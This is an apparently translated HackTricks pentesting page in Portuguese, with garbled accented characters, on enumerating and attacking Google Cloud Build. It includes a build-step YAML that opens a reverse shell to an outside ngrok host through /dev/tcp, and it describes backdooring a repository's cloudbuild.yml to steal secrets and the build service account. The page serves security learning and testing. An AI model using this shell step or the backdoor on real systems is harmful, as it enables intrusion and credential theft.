# GCP - Enumera√ß√£o do Cloud Build

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no GitHub.

</details>

## Informa√ß√µes B√°sicas

O Google Cloud Build √© uma plataforma de CI/CD gerenciada que **automatiza a constru√ß√£o de software** e os processos de lan√ßamento, integrando-se a **reposit√≥rios de c√≥digo-fonte** e oferecendo suporte a uma ampla variedade de linguagens de programa√ß√£o. Ele **permite que os desenvolvedores construam, testem e implantem c√≥digo automaticamente**, ao mesmo tempo em que oferece flexibilidade para personalizar etapas de constru√ß√£o e fluxos de trabalho.

Cada Cloud Build Trigger est√° **relacionado a um Reposit√≥rio do Cloud ou conectado diretamente a um reposit√≥rio externo** (Github, Bitbucket ou Gitlab).

√â poss√≠vel configurar um Cloud Build para **exigir aprova√ß√µes para execu√ß√µes de constru√ß√£o** (desativado por padr√£o).

A **Conta de Servi√ßo tem o escopo `cloud-platform`**, portanto, ela pode **usar todos os privil√©gios**. Se **nenhuma Conta de Servi√ßo for especificada** (como ao fazer um envio), a **Conta de Servi√ßo padr√£o** `<proj-number>@cloudbuild.gserviceaccount.com` ser√° **usada**.

{% hint style="success" %}
N√£o encontrei nenhuma maneira de roubar o token do Github/Bitbucket daqui ou dos Reposit√≥rios do Cloud, porque quando o reposit√≥rio √© baixado, ele √© acessado por meio de um URL [https://source.cloud.google.com/](https://source.cloud.google.com/) e o Github n√£o √© acessado pelo cliente.
{% endhint %}

### Armazenamento

√Äs vezes, o Cloud Build **gerar√° um novo armazenamento para armazenar os arquivos do gatilho**. Isso acontece, por exemplo, no exemplo que o GCP oferece com:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Um bucket de armazenamento chamado [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) √© criado para armazenar um arquivo `.tgz` com os arquivos a serem usados.

### Obter shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Enumera√ß√£o

Voc√™ pode encontrar **informa√ß√µes sens√≠veis em configura√ß√µes de compila√ß√£o e registros**.
```bash
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs
```
## Escalada de Privil√©gios

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Acesso n√£o autenticado

### cloudbuild.yml

Se voc√™ comprometer o acesso de grava√ß√£o a um reposit√≥rio contendo um arquivo chamado **`cloudbuild.yml`**, voc√™ pode **inserir um backdoor** neste arquivo, que especifica os **comandos que ser√£o executados** dentro de um Cloud Build e exfiltrar as informa√ß√µes secretas, comprometer o que √© feito e tamb√©m comprometer a **conta de servi√ßo do Cloud Build**.

{% hint style="info" %}
Observe que o GCP tem a op√ß√£o de permitir que os administradores controlem a execu√ß√£o de sistemas de compila√ß√£o a partir de PRs externos por meio do "Comment Control". O Comment Control √© um recurso em que colaboradores/donos de projetos **precisam comentar "/gcbrun" para acionar a compila√ß√£o** em rela√ß√£o ao PR e o uso desse recurso impede que qualquer pessoa na internet acione seus sistemas de compila√ß√£o.
{% endhint %}

Para obter informa√ß√µes relacionadas, voc√™ pode verificar a p√°gina sobre como atacar as A√ß√µes do Github (semelhante a isso):

{% content-ref url="../../../pentesting-ci-cd/github-security/abusing-github-actions/" %}
[abusing-github-actions](../../../pentesting-ci-cd/github-security/abusing-github-actions/)
{% endcontent-ref %}

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **vers√£o mais recente do PEASS ou baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no GitHub.

</details>
